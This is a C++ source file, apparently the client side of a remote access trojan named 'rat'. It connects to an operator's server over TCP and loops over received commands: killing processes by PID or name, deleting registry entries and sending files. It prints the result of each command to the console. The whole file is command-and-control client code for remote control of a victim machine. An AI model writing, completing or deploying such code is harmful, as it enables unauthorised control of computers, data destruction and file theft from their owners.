#pragma once

#include "client.h"

rat::Client::Client(const std::string_view server_ip_address, int server_port): server_ip_address_(server_ip_address), server_port_(server_port){};

long long rat::Client::ConnectToServer()
{
	int i_result;
	
	auto connect_socket = INVALID_SOCKET;
	struct sockaddr_in client_service{};

	#ifdef _WIN32
		WSADATA wsa_data;
		//----------------------
		// Initialize Winsock
		i_result = WSAStartup(MAKEWORD(2, 2), &wsa_data);
		if (i_result != NO_ERROR) {
			return i_result;
		}
	#endif
	//----------------------
	// Create a SOCKET for connecting to server
	connect_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (connect_socket == INVALID_SOCKET) {
		goto CONNECT_FAILED;
	}

	//----------------------
	// The sockaddr_in structure specifies the address family,
	// IP address, and port of the server to be connected to.
	client_service.sin_family = AF_INET;
	client_service.sin_port = htons(static_cast<u_short>(server_port_));
	#ifdef _WIN32
		InetPtonA(AF_INET, &server_ip_address_[0], &client_service.sin_addr.s_addr);
	#elif __linux__
		inet_pton(AF_INET, &server_ip_address_[0], &client_service.sin_addr);
	#endif
	//----------------------
	// Connect to server.
	i_result = connect(connect_socket, (sockaddr*)&client_service, sizeof(client_service));
	if (i_result == SOCKET_ERROR) {
		goto CONNECT_FAILED;
	}
	sock_ = TcpSocket(connect_socket);
	return 0;

	CONNECT_FAILED:
		if (sock_.GetSocket() != INVALID_SOCKET) {
			sock_.Close();
		}
		#ifdef _WIN32
			WSACleanup();
			return WSAGetLastError();
		#elif __linux__
			return i_result;
		#endif //
}

void rat::Client::ReceiveCommand()
{
	while(sock_.GetSocket() != INVALID_SOCKET)
	{
		int cmd_size = sock_.RecvInt();
		if (sock_.Disconnected()){
			continue;
		}
		std::vector<char> v = sock_.RecvBytes(cmd_size - 4);
		if (v.size() != static_cast<unsigned long long>(cmd_size) - 4)
		{
			continue;
		}
		char* buff = std::to_address(v.begin());
		ClientCmd cmd(sock_, buff, static_cast<int>(v.size()));
		if (cmd.execute())
		{
			using enum rat::Command::CommandType;
			if (cmd.GetType() == static_cast<int>(kClientKillPid))
			{
				std::cout << "Successfully execute kill PID command from server with content: " << cmd.GetArgument()<< std::endl;
			}
			else if (cmd.GetType() == static_cast<int>(kClientKillProcessName))
			{
				std::cout << "Successfully execute kill process name command from server with content: " << cmd.GetArgument()<< std::endl;
			}
			else if (cmd.GetType() == static_cast<int>(kClientDeleteRegistry))
			{
				std::cout << "Successfully execute delete registry command from server with content: " << cmd.GetArgument()<< std::endl;
			}
			else if (cmd.GetType() == static_cast<int>(kClientSendFile))
			{
				std::cout << "Successfully execute send file command from server with content: " << cmd.GetArgument()<< std::endl;
			}

		}
		else
		{
			using enum rat::Command::CommandType;
			if (cmd.GetType() == static_cast<int>(kClientKillPid))
			{
				std::cout << "Failed to execute kill PID command from server with content: " << cmd.GetArgument()<< std::endl;
			}
			else if (cmd.GetType() == static_cast<int>(kClientKillProcessName))
			{
				std::cout << "Failed to execute kill process name command from server with content: " << cmd.GetArgument()<< std::endl;

			}
			else if (cmd.GetType() == static_cast<int>(kClientDeleteRegistry))
			{
				std::cout << "Failed to execute delete registry command from server with content: " << cmd.GetArgument()<< std::endl;

			}
			else if (cmd.GetType() == static_cast<int>(kClientSendFile))
			{
				std::cout << "Failed to execute send file command from server with content: " << cmd.GetArgument()<< std::endl;
			}
			else if (cmd.GetType() == -1)
			{
				std::cout << "Invalid command from the server: " << std::string(v.begin(), v.end()) << std::endl;
			}
		}
		std::cout << std::flush;
	}
	
}

void rat::Client::Clean()
{
	if (sock_.GetSocket() != INVALID_SOCKET) {
		sock_.Close();
	}
	#ifdef _WIN32
		WSACleanup();
	#endif

}

int rat::Client::GetServerPort() const
{
	return server_port_;
}

std::string rat::Client::GetServerAddress() const
{
	return server_ip_address_;
}
